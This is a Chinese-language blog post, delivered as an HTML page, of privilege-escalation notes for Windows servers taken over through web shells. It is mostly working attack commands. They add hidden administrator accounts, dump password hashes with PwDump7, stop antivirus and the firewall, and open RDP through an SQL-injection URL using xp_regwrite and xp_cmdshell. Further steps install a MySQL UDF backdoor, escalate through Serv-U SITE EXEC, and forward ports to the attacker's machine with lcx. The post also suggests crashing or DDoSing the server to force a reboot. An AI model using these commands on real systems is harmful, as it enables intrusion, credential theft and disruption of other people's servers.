@@ -1,0 +1,362 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>内网提权小笔记 | 今天阳光明媚</title><meta name="keywords" content="Windows,内网渗透,Linux,后渗透"><meta name="author" content="JIANG"><meta name="copyright" content="JIANG"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="提权笔记**web提权 ** 能不能执行cmd就看这个命令：net user，net不行就用net1，再不行就上传一个net到可写可读目录，执行&#x2F;c c:windowstempcookiesnet1.exe user  当提权成功，3389没开的情况下，上传开3389的vps没成功时，试试上传rootkit.asp 用刚提权的用户登录进去就是system权限，再试试一般就可以了。  cm">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网提权小笔记">
+<meta property="og:url" content="http://jzlzm.top/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83%E5%B0%8F%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="今天阳光明媚">
+<meta property="og:description" content="提权笔记**web提权 ** 能不能执行cmd就看这个命令：net user，net不行就用net1，再不行就上传一个net到可写可读目录，执行&#x2F;c c:windowstempcookiesnet1.exe user  当提权成功，3389没开的情况下，上传开3389的vps没成功时，试试上传rootkit.asp 用刚提权的用户登录进去就是system权限，再试试一般就可以了。  cm">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/3034930596/pic/main/img/202207151115167.jpg">
+<meta property="article:published_time" content="2021-11-19T08:20:40.000Z">
+<meta property="article:modified_time" content="2022-07-15T03:15:22.944Z">
+<meta property="article:author" content="JIANG">
+<meta property="article:tag" content="Windows">
+<meta property="article:tag" content="内网渗透">
+<meta property="article:tag" content="Linux">
+<meta property="article:tag" content="后渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/3034930596/pic/main/img/202207151115167.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://jzlzm.top/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83%E5%B0%8F%E7%AC%94%E8%AE%B0/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '内网提权小笔记',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-07-15 11:15:22'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首♥页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 历♥史</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标♥签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分♥类</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://raw.githubusercontent.com/3034930596/pic/main/img/202207151115167.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">今天阳光明媚</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首♥页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 历♥史</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标♥签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分♥类</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">内网提权小笔记</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-11-19T08:20:40.000Z" title="发表于 2021-11-19 16:20:40">2021-11-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-07-15T03:15:22.944Z" title="更新于 2022-07-15 11:15:22">2022-07-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">5.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>20分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="内网提权小笔记"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="提权笔记"><a href="#提权笔记" class="headerlink" title="提权笔记"></a>提权笔记</h1><h2 id="web提权"><a href="#web提权" class="headerlink" title="**web提权 **"></a>**web提权 **</h2><ol>
+<li><p>能不能执行cmd就看这个命令：net user，net不行就用net1，再不行就上传一个net到可写可读目录，执行&#x2F;c c:windowstempcookiesnet1.exe user</p>
+</li>
+<li><p>当提权成功，3389没开的情况下，上传开3389的vps没成功时，试试上传rootkit.asp 用刚提权的用户登录进去就是system权限，再试试一般就可以了。</p>
+</li>
+<li><p>cmd拒绝访问的话就自己上传一个cmd.exe 自己上传的后缀是不限制后缀的，cmd.exe&#x2F;cmd.com&#x2F;cmd.txt 都可以。</p>
+</li>
+<li><p>cmd命令：systeminfo，看看有没有KB952004、KB956572、KB970483这三个补丁，如果没有，第一个是pr提权，第二个是巴西烤肉提权，第三个是iis6.0提权。</p>
+</li>
+<li><p>c:windowstempcookies 这个目录</p>
+</li>
+<li><p>找sa密码或是root密码，直接利用大马的文件搜索功能直接搜索，超方便！</p>
+</li>
+<li><p>cmd执行exp没回显的解决方法：com路径那里输入exp路径C:RECYCLERpr.exe，命令那里清空(包括&#x2F;c )输入”net user jianmei daxia &#x2F;add”</p>
+</li>
+<li><p>增加用户并提升为管理员权限之后，如果连接不上3389，上传rootkit.asp脚本，访问会提示登录，用提权成功的账号密码登录进去就可以拥有管理员权限了。</p>
+</li>
+<li><p>有时变态监控不让添加用户，可以尝试抓管理哈希值，上传“PwDump7 破解当前管理密码(hash值)”，俩个都上传，执行PwDump7.exe就可以了，之后到网站去解密即可。</p>
+</li>
+<li><p>有时增加不上用户，有可能是密码过于简单或是过于复杂，还有就是杀软的拦截，命令 tasklist 查看进程</p>
+</li>
+<li><p>其实星外提权只要一个可执行的文件即可，先运行一遍cmd，之后把星外ee.exe命名为log.csv 就可以执行了。</p>
+</li>
+<li><p>用wt.asp扫出来的目录，其中红色的文件可以替换成exp，执行命令时cmd那里输入替换的文件路径，下面清空双引号加增加用户的命令。</p>
+</li>
+<li><p>提权很无奈的时候，可以试试TV远控，通杀内外网，穿透防火墙，很强大的。</p>
+</li>
+<li><p>当可读可写目录存在空格的时候，会出现这样的情况：’C:Documents’ 不是内部或外部命令，也不是可运行的程序 或批处理文件。解决办法是利用菜刀的交互shell切换到exp路径，如：Cd C:Documents and SettingsAll UsersApplication DataMicrosoft 目录<br>然后再执行exp或者cmd，就不会存在上面的情况了，aspshell一般是无法跳转目录的～</p>
+</li>
+<li><p>有时候可以添加用户，但是添加不到管理组，有可能是administrators改名了，net user administrator 看下本地组成员，*administrators</p>
+</li>
+<li><p>进入服务器，可以继续内网渗透 这个时候可以尝试打开路由器 默认帐号密码 admin admin</p>
+</li>
+<li><p>有的cmd执行很变态，asp马里，cmd路径填上面，下面填：””c:xxxexp.exe “whoami” 记得前面加两个双引号，不行后面也两个，不行就把exp的路径放在cmd那里，下面不变。</p>
+</li>
+<li><p>一般增加不上用户，或是想添加增加用户的vbs,bat,远控小马到服务器的启动项里，用“直接使服务器蓝屏重启的东东”这个工具可以实现，</p>
+</li>
+<li><p>执行PwDump7.exe抓哈希值的时候，建议重定向结果到保存为1.txt &#x2F;c c:windowstempcookiesPwDump7.exe &gt;1.txt</p>
+</li>
+<li><p>菜刀执行的技巧，上传cmd到可执行目录，右击cmd 虚拟终端，help 然后setp c:windowstempcmd.exe 设置终端路径为：c:windowstempcmd.exe</p>
+</li>
+<li><p>当不支持aspx，或是支持但跨不了目录的时候，可以上传一个读iis的vps，执行命令列出所有网站目录，找到主站的目录就可以跨过去了。<br>上传cscript.exe到可执行目录，接着上传iispwd.vbs到网站根目录，cmd命令&#x2F;c “c:windowstempcookiescscript.exe” d:webiispwd.vbs</p>
+</li>
+<li><p>如何辨别服务器是不是内网？192.168.x.x 172.16.x.x 10.x.x.x</p>
+</li>
+</ol>
+<h2 id="dos命令大全"><a href="#dos命令大全" class="headerlink" title="dos命令大全"></a><strong>dos命令大全</strong></h2><p>查看版本：ver</p>
+<p>查看权限：whoami</p>
+<p>查看配置：systeminfo</p>
+<p>查看用户：net user</p>
+<p>查看进程：tasklist</p>
+<p>查看正在运行的服务：tasklist &#x2F;svc</p>
+<p>查看开放的所有端口：netstat -ano</p>
+<p>查询管理用户名：query user</p>
+<p>查看搭建环境：ftp 127.0.0.1</p>
+<p>查看指定服务的路径：sc qc Mysql</p>
+<p>添加一个用户：net user jianmei daxia.asd &#x2F;add</p>
+<p>提升到管理权限：net localgroup administrators jianmei &#x2F;add</p>
+<p>添加用户并提升权限：net user jianmei daxia.asd &#x2F;add &amp; net localgroup administrators jianmei &#x2F;add</p>
+<p>查看制定用户信息：net user jianmei</p>
+<p>查看所有管理权限的用户：net localgroup administrators</p>
+<p>加入远程桌面用户组：net localgroup “Remote Desktop Users” jianmei &#x2F;add</p>
+<p>突破最大连接数：mstsc &#x2F;admin &#x2F;v:127.0.0.1</p>
+<p>删除用户：net user jianmei &#x2F;del</p>
+<p>删除管理员账户:net user administrator daxia.asd</p>
+<p>更改系统登陆密码：net password daxia.asd</p>
+<p>激活GUEST用户：net user guest &#x2F;active:yes</p>
+<p>开启TELNET服务：net start telnet</p>
+<p>关闭麦咖啡：net stop “McAfee McShield”</p>
+<p>关闭防火墙：net stop sharedaccess</p>
+<p>查看当前目录的所有文件：dir c:windows</p>
+<p>查看制定文件的内容：type c:windows1.asp</p>
+<p>把cmd.exe复制到c:windows的temp目录下并命名为cmd.txt：</p>
+<p>copy c:windowstempcookiescmd.exe c:windowstempcmd.txt</p>
+<p>开3389端口的命令：</p>
+<p>REG ADD HKLMSYSTEMCurrentControlSetControlTerminal” “Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f</p>
+<p>查 看补丁：</p>
+<p>dir c:windows&gt;a.txt&amp;(for %i in (KB952004.log KB956572.log KB2393802.log KB2503665.log KB2592799.log KB2621440.log KB2160329.log KB970483.log KB2124261.log KB977165.log KB958644.log) do @type a.txt|@find &#x2F;i “%i”||@echo %i Not Installed!)&amp;del &#x2F;f &#x2F;q &#x2F;a a.txt</p>
+<h3 id="SQL语句直接开启3389"><a href="#SQL语句直接开启3389" class="headerlink" title="SQL语句直接开启3389"></a><strong>SQL语句直接开启3389</strong></h3><p>3389登陆关键注册表位置：</p>
+<p>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TerminalServer\DenyTSConnections</p>
+<p>其中键值DenyTSConnections 直接控制着3389的开启和关闭，当该键值为0表示3389开启，1则表示关闭。</p>
+<p>而MSSQL的xp_regwrite的存储过程可以对注册进行修改，我们使用这点就可以简单的修改DenyTSConnections键值，从而控制3389的关闭和开启。</p>
+<p>开启3389的SQL语句：</p>
+<p>syue.com&#x2F;xiaohua.asp?id&#x3D;100;exec master.dbo.xp_regwrite’HKEY_LOCAL_MACHINE’,’SYSTEM\CurrentControlSet\Control\Terminal Server’,’fDenyTSConnections’,’REG_DWORD’,0;–</p>
+<p>关闭3389的SQL语句：</p>
+<p>syue.com&#x2F;xiaohua.asp?id&#x3D;100;exec master.dbo.xp_regwrite’HKEY_LOCAL_MACHINE’,’SYSTEM\CurrentControlSet\Control\Terminal Server ’,’fDenyTSConnections’,’REG_DWORD’,1;–</p>
+<h2 id="常见杀软"><a href="#常见杀软" class="headerlink" title="常见杀软"></a><strong>常见杀软</strong></h2><p>360tray.exe 360实时保护</p>
+<p>ZhuDongFangYu.exe 360主动防御</p>
+<p>KSafeTray.exe 金山卫士</p>
+<p>McAfee McShield.exe 麦咖啡</p>
+<p>SafeDogUpdateCenter.exe 服务器安全狗</p>
+<h2 id="windows提权中敏感目录和敏感注册表的利用"><a href="#windows提权中敏感目录和敏感注册表的利用" class="headerlink" title="windows提权中敏感目录和敏感注册表的利用"></a>windows提权中敏感目录和敏感注册表的利用</h2><h3 id="敏感目录-目录权限-提权用途"><a href="#敏感目录-目录权限-提权用途" class="headerlink" title="敏感目录 目录权限 提权用途"></a>敏感目录 目录权限 提权用途</h3><p>C:Program Files 默认用户组users对该目录拥有查看权 可以查看服务器安装的应用软件<br>C:Documents and SettingsAll Users「开始」菜单程序 Everyone拥有查看权限 存放快捷方式，可以下载文件，属性查看安装路径<br>C:Documents and SettingsAll UsersDocuments Everyone完全控制权限 上传执行cmd及exp<br>C:windowssystem32inetsrv Everyone完全控制权限 上传执行cmd及exp<br>C:windowsmy.iniC:Program FilesMySQLMySQL Server 5.0my.ini 默认用户组users拥有查看权限 安装mysql时会将root密码写入该文件<br>C:windowssystem32 默认用户组users拥有查看权限 Shift后门一般是在该文件夹，可以下载后门破解密码<br>C:Documents and SettingsAll Users「开始」菜单程序启动 Everyone拥有查看权限 可以尝试向该目录写入vbs或bat，服务器重启后运行。<br>C:RECYCLERD:RECYCLER Everyone完全控制权限 回收站目录。常用于执行cmd及exp<br>C:Program FilesMicrosoft SQL Server 默认用户组users对该目录拥有查看权限 收集mssql相关信息，有时候该目录也存在可执行权限<br>C:Program FilesMySQL 默认用户组users对该目录拥有查看权限 找到MYSQL目录中user.MYD里的root密码<br>C:oraclexe 默认用户组users对该目录拥有查看权限 可以尝试利用Oracle的默认账户提权<br>C:WINDOWSsystem32config 默认用户组users对该目录拥有查看权限 尝试下载sam文件进行破解提权<br>C:Program FilesGeme6 FTP ServerRemote AdminRemote.ini 默认用户组users对该目录拥有查看权限 Remote.ini文件中存放着G6FTP的密码<br>c:Program FilesRhinoSoft.comServ-Uc:Program FilesServ-U 默认用户组users对该目录拥有查看权限 ServUDaemon.ini 中存储了虚拟主机网站路径和密码<br>c:windowssystem32inetsrvMetaBase.xml 默认用户组users对该目录拥有查看权限 IIS配置文件<br>C:tomcat5.0confresin.conf 默认用户组users对该目录拥有查看权限 Tomat存放密码的位置<br>C:ZKEYSSetup.ini 默认用户组users对该目录拥有查看权限 ZKEYS虚拟主机存放密码的位置</p>
+<h3 id="提权中的敏感注册表位置"><a href="#提权中的敏感注册表位置" class="headerlink" title="提权中的敏感注册表位置"></a><strong>提权中的敏感注册表位置</strong></h3><p>HKEY_LOCAL_MACHINESOFTWAREMicrosoftMSSQLServerMSSQLServerSuperSocketNetLibTcp Mssql端口<br>HKLMSYSTEMCurrentControlSetControlTerminal Server DenyTSConnections 远程终端 值为0 即为开启<br>HKEY_LOCAL_MACHINESOFTWAREMySQL AB mssql的注册表位置<br>HKEY_LOCAL_MACHINESOFTWAREHZHOSTCONFIG 华众主机注册表配置位置<br>HKEY_LOCAL_MACHINESOFTWARECat SoftServ-UDomains1UserList serv-u的用户及密码（su加密）位置<br>HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlTerminalServer WinStationsRDP-Tcp 在该注册表位置PortNumber的值即位3389端口值<br>HKEY_CURRENT_USERSoftwarePremiumSoftNavicatServers mysql管理工具Navicat的注册表位置，提权运用请谷歌<br>HKEY_LOCAL_MACHINESYSTEMRAdminv2.0ServerParameters Radmin的配置文件，提权中常将其导出进行进行覆盖提权<br>HKEY_LOCAL_MACHINESYSTEMControlSet002ServicesMSFtpsvcParametersVirtual Roots IIS注册表全版本泄漏用户路径和FTP用户名漏洞<br>HKEY_LOCAL_MACHINEsoftwarehzhostconfigSettingsmastersvrpass 华众主机在注册表中保存的mssql、mysql等密码<br>HKEY_LOCAL_MACHINESYSTEMLIWEIWENSOFTINSTALLFREEADMIN11 星外主机mssql的sa账号密码，双MD5加密<br>HKEY_LOCAL_MACHINESYSTEMControlSet002ServicesMSFtpsvcParametersVirtual RootsControlSet002 星外ftp的注册表位置，当然也包括ControlSet001、ControlSet003</p>
+<h3 id="wscript-shell的删除和恢复"><a href="#wscript-shell的删除和恢复" class="headerlink" title="**wscript.shell的删除和恢复 **"></a>**wscript.shell的删除和恢复 **</h3><p>载wscript.shell对象，在cmd下或直接运行：regsvr32 &#x2F;u %windir%system32WSHom.Ocx</p>
+<p>卸载FSO对象，在cmd下或直接运行：regsvr32.exe &#x2F;u %windir%system32scrrun.dll</p>
+<p>卸载stream对象，在cmd下或直接运行：regsvr32 &#x2F;s &#x2F;u “C:ProgramFilesCommonFilesSystemadomsado15.dll”</p>
+<p>如果想恢复的话只需要去掉&#x2F;U 即可重新再注册以上相关ASP组件，这样子就可以用了</p>
+<h2 id="如何找到准确的终端连接端口"><a href="#如何找到准确的终端连接端口" class="headerlink" title="如何找到准确的终端连接端口"></a><strong>如何找到准确的终端连接端口</strong></h2><p>在aspx大马里，点击“系统信息”第三个就是目前的3389端口</p>
+<p>或是执行命令查看正在运行的服务：tasklist &#x2F;svc</p>
+<p>找到：svchost.exe 1688 TermService</p>
+<p>记住1688这个ID值，</p>
+<p>查看开放的所有端口：netstat -ano</p>
+<p>找到1688这个ID值所对应的端口就是3389目前的端口</p>
+<h2 id="iis6提权提示Can-not-find-wmiprvse-exe的突破方法"><a href="#iis6提权提示Can-not-find-wmiprvse-exe的突破方法" class="headerlink" title="**iis6提权提示Can not find wmiprvse.exe的突破方法 **"></a>**iis6提权提示Can not find wmiprvse.exe的突破方法 **</h2><p>windows2003   iis6</p>
+<p>iis7在windows2008以上</p>
+<ul>
+<li><p>突破方法一：</p>
+<p>在IIS环境下，如果权限做得不严格，我们在aspx大马里面是有权限直接结束wmiprvse.exe进程的，进程查看里面直接K掉</p>
+<p>在结束之后，它会再次运行，这时候的PID值的不一样的。这时候我们回来去运行exp，直接秒杀。</p>
+</li>
+<li><p>突破方法二：</p>
+<p>虚拟主机，一般权限严格限制的，是没权限结束的，这时候我们可以考虑配合其他溢出工具让服务器强制重启，比如“直接使服务器蓝屏重启的东东”</p>
+<p>甚至可以暴力点，DDOS秒杀之，管理发现服务器不通了首先肯定是以为服务器死机，等他重启下服务器（哪怕是IIS重启下）同样秒杀之。</p>
+</li>
+</ul>
+<h2 id="本地溢出提权"><a href="#本地溢出提权" class="headerlink" title="本地溢出提权"></a>本地溢出提权</h2><p>计算机有个地方叫缓存区,程序的缓存区长度是被事先设定好的,如果用户输入的数据超过了这个缓存区的长度,那么这个程序就会溢出了.</p>
+<p>缓存区溢出漏洞主要是由于许多软件没有对缓存区检查而造成的.</p>
+<p>利用一些现成的造成溢出漏洞的exploit通过运行,把用户从users组或其它系统用户中提升到administrators组.</p>
+<p>想要执行cmd命令，就要wscript.shell组建支持，或是支持aspx脚本也行，因为aspx脚本能调用.net组件来执行cmd的命令.</p>
+<h3 id="sa提权-–windows-sqlserver只能用于windows"><a href="#sa提权-–windows-sqlserver只能用于windows" class="headerlink" title="sa提权 –windows sqlserver只能用于windows"></a>sa提权 –windows sqlserver只能用于windows</h3><p>扫描开放的端口，1433开了就可以找sa密码提权，用大马里的搜索文件功能，sa密码一般在conn.asp config.asp web.config 这三个文件也可以通过注册表找配置文件，看下支持aspx不，支持的话跨目录到别的站点上找，找到之后用aspshell自带的sql提权登录再执行命令创建用户即可。</p>
+<p>aspx马提权执行命令有点不一样，点击数据库管理–选MSSQL–server&#x3D;localhost;UID&#x3D;sa;PWD&#x3D;;database&#x3D;master;Provider&#x3D;SQLOLEDB–输入帐号密码连接即可</p>
+<p>增加一个用户：exec master.dbo.xp_cmdshell ‘net user jianmei daxia.asd &#x2F;add’;–<br>提升为管理员：exec master.dbo.xp_cmdshell ‘net localgroup administrators jianmei &#x2F;add’;–</p>
+<p>PS:如果增加不上，说明是xp_cmdshell组建没有，增加xp_cmdshell组建：Use master dbcc addextendedproc(‘xp_cmdshell’,’xplog70.dll’)</p>
+<h3 id="root提权-–windows-x2F-linux"><a href="#root提权-–windows-x2F-linux" class="headerlink" title="root提权 –windows&#x2F;linux"></a>root提权 –windows&#x2F;linux</h3><p>利用mysql提权的前提就是,服务器安装了mysql,mysql的服务没有降权,是默认安装以系统权限继承的(system权限). 并且获得了root的账号密码</p>
+<p>如何判断一台windows服务器上的mysql有没有降权？<br>cmd命令net user 如果存在 mysql mssql这样用户或者类似的.通常就是它的mssql mysql服务已经被降权运行了</p>
+<p>如何判断服务器上是否开启了mysql服务？<br>开了3306端口，有的管理员会把默认端口改掉.另一个判断方法就是网站是否支持php,一般支持的话都是用mysql数据库的.</p>
+<p>如何查看root密码？<br>在mysql的安装目录下找到user.myd这个文件，root就藏在里面，一般是40位cmd加密，一些php网站安装的时候用的是root用户,在conn.asp config.asp这些文件里。<br>有时会显得很乱，这时就需要自己去组合，前17位在第一行可以找到，还有23位在第三行或是其他行，自己继续找。</p>
+<p>可以直接用php脚本里“mysql执行”，或是上传个UDF.php，如果网站不支持PHP，可以去旁一个php的站，也可以把UDF.php上传到别的phpshell上也可以。</p>
+<p>填入帐号密码之后，自然就是安装DLL了，点击“自动安装Mysql BackDoor” 显示导出跟创建函数成功后，紧接着执行增加用户的命令即可。</p>
+<p>注意：5.0版本以下(包括5.0的)默认c:windows系统目录就可以了，5.1版本以上的不能导出到系统目录下创建自定义函数，只能导出在mysql安装目录下的lib&#x2F;plugin目录中</p>
+<p>例如：D:&#x2F;Program Files&#x2F;MySQL&#x2F;MySQL Server 5.1&#x2F;lib&#x2F;plugin&#x2F;mysql.dll</p>
+<p>如果密码看不见，或是组合不到40位，就本地安装一个mysql吧，<br>1、停止mysql服务<br>2、替换下载下来的3个文件（user.MYI user.MYD user.frm）<br>3、cmd切换到bin目录下，进入mysql安全模式，cmd命令：mysqld-nt –skip-grant-tables<br>4、重新打开一个cmd 切换到bin目录下，cmd命令：mysql -u root 版本不同有可能是：mysql -uroot -proot<br>5、最后查询一下就出来了select user,password from mysql.user;</p>
+<h3 id="serv-u提权-–ftp–windows"><a href="#serv-u提权-–ftp–windows" class="headerlink" title="serv-u提权 –ftp–windows"></a>serv-u提权 –ftp–windows</h3><p>这个文件里包含serv-u的md5密码：C:Program FilesRhinoSoft.comServ-U\ServUDaemon.ini</p>
+<p>找到这个文件：ServUDaemon.ini 打开找到：LocalSetupPassword&#x3D;nqFCE64E0056362E8FCAF813094EC39BC2</p>
+<p>再拿md5密文去解密，再用现在的密码登陆提权即可。</p>
+<p>serv-u提权的前提是43958端口开了，且知道帐号密码！</p>
+<p>如果帐号密码默认，直接用shell里面的serv-u提权功能即可搞定，建议用aspx马、php马去提权，因为可以看回显。</p>
+<p>530说明密碼不是默认的,回显330说明成功，900说明密码是默认的……………..</p>
+<p>在程序里找个快捷方式，或是相关的文件进行下载到本地，再查看文件的属性，就可以找到serv-u的安装目录了。</p>
+<p>目录有修改权限之serv-u提权：</p>
+<p>找到serv-u的目录，再找到用户的配置文件ServUDaemon.ini，直接增加一个用户代码，保存！</p>
+<p>接着本地cmd命令：ftp 服务器ip</p>
+<p>回车，输入帐号密码再回车………………….</p>
+<p>接着先试试普通的cmd命令提权，不行的话就使用ftp提权的命令：</p>
+<p>Quote site exec net user jianmei daxia &#x2F;add 增加一个用户</p>
+<p>Quote site exec net localgroup administrators jianmei &#x2F;add 提升到管理员权限</p>
+<p>200 EXEC command successful (TID&#x3D;33). 执行成功的回显信息</p>
+<p>Maintenance&#x3D;System 权限类型多加一行指定新加帐号为系统管理员</p>
+<p>ReloadSettings&#x3D;True 在修改ini文件后需加入此项，这时serv-u会自动刷新配置文件并生效</p>
+<h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><p>什么情况下适合转发端口？</p>
+<p>1.服务器是内网，我们无法连接。<br>2.服务器上有防火墙，阻断我们的连接。</p>
+<p>转发端口的前提，我们是外网或是有外网服务器。</p>
+<p>找个可读可写目录上传lcx.exe</p>
+<p>本地cmd命令：lcx.exe -listen 1988 4567 （监听本地1988端口并转发到4567端口）</p>
+<p>接着shell命令：&#x2F;c c:windowstempcookieslcx.exe -slave 本机ip 1988 服务器ip 3389 （把服务器3389端口转发到本地4567端口）</p>
+<p>之后本地连接：127.0.0.1:4567 (如果不想加上:4567的话，本地执行命令的时候，把4567换成3389来执行就行了)</p>
+<p>以上是本机外网情况下操作，接着说下在外网服务器里如何操作：</p>
+<p>上传lxc.exe cmd.exe到服务器且同一目录，执行cmd.exe命令：lcx.exe -listen 1988 4567</p>
+<p>接着在aspxshell里点击端口映射，远程ip改为站点的ip，远端口程填1988，点击映射端口，接着在服务器里连接127.0.0.1:4567就可以了。</p>
